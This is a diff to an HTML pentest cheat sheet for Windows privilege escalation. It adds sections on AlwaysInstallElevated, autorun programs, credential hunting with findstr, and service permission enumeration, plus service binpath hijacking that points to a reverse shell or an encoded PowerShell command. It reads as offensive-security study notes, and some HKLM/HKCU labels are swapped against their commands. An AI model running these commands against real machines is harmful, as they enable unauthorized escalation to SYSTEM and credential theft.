@@ -751,11 +751,11 @@
     </ul>
     <li>SeAssignPrimaryTokenPrivilege</li>
     <ul>
-        <li>Potato Exploits</li>
+        <li>Potato Exploits (SeImpersonatePrivilege)</li>
     </ul>
     <li>SeLoadDriverPrivilege</li>
     <ul>
-        <li>Create folder called Fuse and put files into it:</li>
+        <li>Download these files:</li>
         <ul>
             <li>Capcom.sys from fuzzysecurity</li>
             <li>https://github.com/TarlogicSecurity/EoPLoadDriver/</li>
@@ -777,7 +777,6 @@
             </ul>
             <li>Select "Release" and "x64"</li>
             <li>Build --> Rebuild Solution.  LoadDriver.exe should be created.</li>
-            <li>Copy LoadDriver.exe file to the Fuse folder</li>
         </ul>
         <li>Compile ExploitCapCom</li>
         <ul>
@@ -894,11 +893,221 @@
     <br>
 
     <h2>Always Install Elevated</h2>
+    <li>Check if enabled</li>
+    <ul>
+        <li>HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</li>
+        <ul>
+            <li>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</li>
+        </ul>
+        <li>HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer</li>
+        <ul>
+            <li>reg query HKLM\software\policies\microsoft\windows\installer /v alwaysinstallelevated</li>
+        </ul>
+        <li>Create msi reverse shell and execute it</li>
+    </ul>
 
+    <h2>Autorun Applications</h2>
+    <li>Enumerate Auto Run Programs</li>
+    <ul>
+        <li>reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</li>
+        <li>check for write to file permissions</li>
+        <ul>
+            <li>accesschk.exe /accepteula -quvw &lt;user&gt; &lt;service&gt;</li>
+        </ul>
+    </ul>
 
+    <h2>Insecure File Permissions</h2>
+    <li>Look for files of any type that can help break into the system.  Scripts with hardcoded credentials, other sensitive files, etc.</li>
+    <li>Search for world writable files:</li>
+    <ul>
+        <li>Accesschk.exe -uws "Everyone" "C:\Program Files"</li>
+        <li>Powershell.exe "Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}"</li>
+    </ul>
+    <li>Configuration Files</li>
+    <ul>
+        <li>Look for files like Unattend.xml which might contain credentials</li>
+        <li>Search for files with pass in the name or ending in .config</li>
+        <ul>
+            <li>dir /s *pass* == *.config</li>
+        </ul>
+    </ul>
+    <li>Recursively search for files in the current directory that contain the word “password” and also end in either .xml, .ini, or .txt:</li>
+    <ul>
+        <li>findstr /si password *.xml *.ini *.txt</li>
+    </ul>
 
-
-
+    <h2>Insecure Services</h2>
+    <li>Manually enumerate insecure services</li>
+    <table>
+        <tr>
+            <td>View user service permissions</td>
+            <td>
+                <li>$acl = get-acl HKLM:\System\CurrentControlSet\Services</li>
+                <li>ConvertFrom-SddlString -Sddl $acl.Sddl -type RegistryRights | ForEach-Object {$_.DiscretionaryAcl}</li>
+            </td>
+        </tr>
+        <tr>
+            <td>List services</td>
+            <td>gci HKLM:\SYSTEM\CurrentControlSet\Services</td>
+        </tr>
+        <tr>
+            <td>
+                <li>List services:</li>
+                <ul>
+                    <li>Running as: SYSTEM</li>
+                    <li>Start/stop type: manual</li>
+                </ul>
+            </td>
+            <td>
+                <table>
+                    <tr>
+                        <td>Create list of all services</td>
+                        <td>$services = Get-ItemProperty -Path HKLM:\System\CurrentControlSet\Services\*</td>
+                    </tr>
+                    <tr>
+                        <td>Show all services owened by SYSTEM and start type is manual</td>
+                        <td>$services | where { ($_.ObjectName -match 'LocalSystem') -and ($_.Start -match '3') }</td>
+                    </tr>
+                    <tr>
+                        <td>Get list of services with only name, no details</td>
+                        <td>$names = $services.pschildname</td>
+                    </tr>
+                    <tr>
+                        <td>List all services owened by SYSTEM, start type manual, and we have permission to start</td>
+                        <td>$canStart = Foreach ($service in $names) { $sddl = (cmd /c sc sdshow $service); if ($sddl -match "RP[A-Z]*?;;;AU") { $service }}</td>
+                    </tr>
+                </table>
+            </td>
+        </tr>
+        <tr>
+            <td>List permissions for a service</td>
+            <td>
+                <li>sc.exe sdshow &lt;service&gt;</li>
+                <li>ConvertFrom-SDDLString -Sddl &quot;&lt;output from sc.exe sdshow &lt;service&gt;&gt;&quot; | ForEach-Object {$_.DiscretionaryAcl}</li>
+                <li>How to read the permissions: https://dimitri.janczak.net/2018/06/01/start-stop-service-rights-to-non-administrators/</li>
+            </td>
+        </tr>
+    </table>
+    <li>Tools</li>
+    <ul>
+        <li>winPEAS</li>
+        <table>
+            <tr>
+                <td>Check for service vulnerabilities</td>
+                <td>winPEASany.exe quiet servicesinfo</td>
+            </tr>
+        </table>
+        <li>sc.exe</li>
+        <table>
+            <tr>
+                <td>Start/Stop a service</td>
+                <td>sc.exe start/stop &lt;service name&gt;</td>
+            </tr>
+            <tr>
+                <td>Query the configuration of a service</td>
+                <td>sc.exe qc &lt;name&gt;</td>
+            </tr>
+            <tr>
+                <td>Query the current status of a service</td>
+                <td>sc.exe query &lt;name&gt;</td>
+            </tr>
+            <tr>
+                <td>Modify a configuration option of a service</td>
+                <td>sc.exe config &lt;name&gt; &lt;option&gt;= &lt;value&gt;</td>
+            </tr>
+            <tr>
+                <td>Change service start type</td>
+                <td>sc config &lt;Service Name&gt; start= auto</td>
+            </tr>
+            <tr>
+                <td>Change binary path</td>
+                <td>sc config &lt;name&gt; binpath= "\"C:\path\to\reverse_shell\""</td>
+            </tr>
+        </table>
+        <li>accesschk.exe</li>
+        <table>
+            <tr>
+                <td>Check for services we have rights/privileges to</td>
+                <td>accesschk.exe /accepteula -uwcqv "Authenticated Users" *</td>
+            </tr>
+            <tr>
+                <td>More details on user groups rights/privileges to a service</td>
+                <td>accesschk.exe /accepteula -ucqv &lt;Service Name&gt;</td>
+            </tr>
+            <tr>
+                <td>verify user permissions to a service</td>
+                <td>accesschk.exe /accepteula -ucqv &lt;username&gt; &lt;service&gt;</td>
+            </tr>
+            <tr>
+                <td>Check for permissions to write in a directory</td>
+                <td>accesschk.exe /accepteula -uwdq C:\directory</td>
+            </tr>
+            <tr>
+                <td>Check for access to insecure executables</td>
+                <td>accesschk.exe /accepteula -quvw &lt;Executable&gt;</td>
+            </tr>
+        </table>
+        <li>net</li>
+        <table>
+            <tr>
+                <td>Start/Stop a service</td>
+                <td>net start/stop &lt;name&gt;</td>
+            </tr>
+        </table>
+        <li>wmic</li>
+        <table>
+            <tr>
+                <td>Check service start options</td>
+                <td>wmic service where caption=&quot;&lt;ServiceName&gt;&quot; get name, caption, state, startmode</td>
+            </tr>
+            <tr>
+                <td>Check running services</td>
+                <td>wmic service get name,displayname,pathname,startmode</td>
+            </tr>
+            <tr>
+                <td>Get running services that are auto and not standard windows</td>
+                <td>wmic service get name,displayname,pathname,startmode |findstr /i "auto"|findstr /i /v "c:\windows"</td>
+            </tr>
+        </table>
+        <li>powershell</li>
+        <table>
+            <tr>
+                <td>List running services</td>
+                <td>Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}</td>
+            </tr>
+            <tr>
+                <td>Start service</td>
+                <td>Start-Service &lt;service&gt;</td>
+            </tr>
+        </table>
+        <li>cmd</li>
+        <table>
+            <tr>
+                <td>List running services</td>
+                <td>tasklist</td>
+            </tr>
+        </table>
+        <li>icacls</li>
+        <table>
+            <tr>
+                <td>Check directory permissions</td>
+                <td>icacls "C:\&lt;Directory&gt;"</td>
+            </tr>
+            <tr>
+                <td>Check for access to insecure executable</td>
+                <td>Icacls &quot;&lt;Executable&gt;&quot;</td>
+            </tr>
+        </table>
+    </ul>
+    <li>Insecure Service Properties</li>
+    <ul>
+        <li>Change binary path</li>
+        <ul>
+            <li>sc config &lt;name&gt; binpath= &quot;\&quot;C:\reverse_shell.exe""</li>
+            <li>sc.exe config usosvc binpath="cmd.exe /c powershell.exe -EncodedCommand &lt;base64&gt;</li>
+        </ul>
+    </ul>
+    <li>Unquoted Service Path</li>
 
 
 
